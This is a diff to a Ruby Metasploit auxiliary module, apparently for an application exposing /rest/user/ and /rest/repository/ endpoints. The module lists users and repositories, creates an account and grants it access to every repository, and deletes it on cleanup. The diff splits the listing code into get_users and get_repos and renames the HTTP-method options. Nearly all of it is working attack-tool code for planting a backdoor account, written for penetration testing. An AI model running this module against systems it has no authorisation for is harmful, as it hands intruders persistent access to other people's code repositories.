@@ -35,7 +35,7 @@ class MetasploitModule < Msf::Auxiliary
             'LIST',
             {
               'Description' => 'List application users',
-              'Method'      => 'GET',
+              'List'      => 'GET',
               'UserPath'    => '/rest/user/'
             }
           ],
@@ -43,7 +43,7 @@ class MetasploitModule < Msf::Auxiliary
             'CREATE',
             {
               'Description' => 'Create a user on the application',
-              'Method'      => 'POST',
+              'Create'      => 'POST',
               'List'        => 'GET',
               'UserPath'    => '/rest/user/',
               'RepoPath'    => '/rest/repository/'
@@ -59,15 +59,17 @@ class MetasploitModule < Msf::Auxiliary
             #'MODIFY',
             #{
               #'Description' => "Change the application user's password",
-              #'Method'      => 'PUT',
-              #'UserPath'    => '/rest/user/'
+              #'Create'      => 'PUT',
+              #'List'        => 'GET',
+              #'UserPath'    => '/rest/user/',
+              #'RepoPath'    => '/rest/repository/'
             #}
           #],
           [
             'LIST_REPOS',
             {
               'Description' => 'List available repositories',
-              'Method'      => 'GET',
+              'List'      => 'GET',
               'RepoPath'    => '/rest/repository/'
             }
           ],
@@ -92,40 +94,8 @@ class MetasploitModule < Msf::Auxiliary
       ])
   end
 
-  def get_list
-    path = action.name =~ /REPOS/ ? action.opts['RepoPath'] : action.opts['UserPath']
-    message = action.name =~ /REPOS/ ? "Repo List" : "User List"
-    begin
-      res = send_request_cgi({
-        'uri'     =>  normalize_uri(path),
-        'method'  =>  action.opts['Method']
-      })
-    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
-           Rex::HostUnreachable, Errno::ECONNRESET => e
-      print_error("Failed: #{e.class} - #{e.message}")
-      return
-    end
-    if res && res.code == 200
-      print_status("#{message}:")
-      begin
-        mylist = JSON.parse(res.body)
-      rescue JSON::ParserError => e
-        print_error("Failed: #{e.class} - #{e.message}")
-        return
-      end
-      mylist.each do |item|
-        if ["LIST"].include?(action.name)
-          print_good("#{item}")
-        else
-          print_good("#{item['name']}")
-        end
-      end
-    end
-  end
-
-  def clean_app
-    path = action.opts['RepoPath']
-    # Get all of the repository names
+  def get_users
+    path = action.opts['UserPath']
     begin
       res = send_request_cgi({
         'uri'     =>  normalize_uri(path),
@@ -136,8 +106,6 @@ class MetasploitModule < Msf::Auxiliary
       print_error("Failed: #{e.class} - #{e.message}")
       return
     end
-
-    # Parse the repository names
     if res && res.code == 200
       begin
         mylist = JSON.parse(res.body)
@@ -145,34 +113,70 @@ class MetasploitModule < Msf::Auxiliary
         print_error("Failed: #{e.class} - #{e.message}")
         return
       end
+      mylist.each do |item|
+        print_good("#{item}")
+      end
+    end
+  end
+
+  def get_repos
+    path = action.opts['RepoPath']
+    begin
+      res = send_request_cgi({
+        'uri'     =>  normalize_uri(path),
+        'method'  =>  action.opts['List']
+      })
+    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
+           Rex::HostUnreachable, Errno::ECONNRESET => e
+      print_error("Failed: #{e.class} - #{e.message}")
+      return nil
+    end
+    if res && res.code == 200
+      begin
+        mylist = JSON.parse(res.body)
+        return mylist
+      rescue JSON::ParserError => e
+        print_error("Failed: #{e.class} - #{e.message}")
+        return nil
+      end
     else
-      print_error("Failed: #{res.body}")
+      return nil
+    end
+  end
+
+  def clean_app
+    user = datastore['USERNAME']
+    unless user
+      print_error("USERNAME required")
       return
     end
 
-    # Remove user from each repository
-    mylist.each do |item|
-      path = action.opts['RepoPath'] + item['name'] + '/user/' + datastore['USERNAME'] + '/'
-      begin
-        res = send_request_cgi({
-          'uri'     =>  normalize_uri(path),
-          'method'  =>  action.opts['Remove']
-        })
-      rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
-             Rex::HostUnreachable, Errno::ECONNRESET => e
-        print_error("Failed: #{e.class} - #{e.message}")
-        return
-      end
+    mylist = get_repos
+    if mylist
+      # Remove user from each repository
+      mylist.each do |item|
+        path = action.opts['RepoPath'] + item['name'] + '/user/' + user + '/'
+        begin
+          res = send_request_cgi({
+            'uri'     =>  normalize_uri(path),
+            'method'  =>  action.opts['Remove']
+          })
+        rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
+               Rex::HostUnreachable, Errno::ECONNRESET => e
+          print_error("Failed: #{e.class} - #{e.message}")
+          return
+        end
 
-      if res && res.code == 200
-        print_good("#{res.body}")
-      else
-        print_status("User #{datastore['USERNAME']} doesn't have access to #{item['name']}")
+        if res && res.code == 200
+          print_good("#{res.body}")
+        else
+          print_status("User #{user} doesn't have access to #{item['name']}")
+        end
       end
     end
 
     # Delete the user account
-    path = action.opts['UserPath'] + datastore['USERNAME'] + '/'
+    path = action.opts['UserPath'] + user + '/'
     begin
       res = send_request_cgi({
         'uri'     =>  normalize_uri(path),
@@ -200,7 +204,7 @@ class MetasploitModule < Msf::Auxiliary
       data = 'username=' << user << '&password=' << pass
       res = send_request_cgi({
         'uri'     =>  normalize_uri(action.opts['UserPath']),
-        'method'  =>  action.opts['Method'],
+        'method'  =>  action.opts['Create'],
         'encode'  =>  true,
         'data'    =>  data
       })
@@ -216,32 +220,14 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    # Make a request for the repositories
-    begin
-      res = send_request_cgi({
-        'uri'     => normalize_uri(action.opts['RepoPath']),
-        'method'  => action.opts['List']
-      })
-    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
-           Rex::HostUnreachable, Errno::ECONNRESET => e
-      print_error("Failed: #{e.class} - #{e.message}")
-      return
-    end
-
-    if res && res.code == 200
-      begin
-        mylist = JSON.parse(res.body)
-      rescue JSON::ParserError => e
-        print_error("Failed: #{e.class} - #{e.message}")
-        return
-      end
-      # Loop over repositories and add the user to it
+    mylist = get_repos
+    if mylist
       mylist.each do |item|
         path = action.opts['RepoPath'] + item['name'] + '/user/' + user + '/'
         begin
           res = send_request_cgi({
             'uri'     =>  normalize_uri(path),
-            'method'  =>  action.opts['Method']
+            'method'  =>  action.opts['Create']
           })
         rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
               Rex::HostUnreachable, Errno::ECONNRESET => e
@@ -255,12 +241,25 @@ class MetasploitModule < Msf::Auxiliary
           print_error("#{res.body}")
         end
       end
+    else
+      print_error("Failed to retrieve repository list")
     end
   end
 
   def run
-    if ["LIST","LIST_REPOS"].include?(action.name)
-      get_list
+    if ["LIST"].include?(action.name)
+      print_status('Retrieving Users')
+      get_users
+    elsif ["LIST_REPOS"].include?(action.name)
+      print_status('Retrieving Repositories')
+      mylist = get_repos
+      if mylist
+        mylist.each do |item|
+          print_good("#{item['name']}")
+        end
+      else
+        print_error("Failed to retrieve repository list")
+      end
     elsif ["CLEANUP"].include?(action.name)
       clean_app
     elsif datastore['USERNAME'] && datastore['PASSWORD']
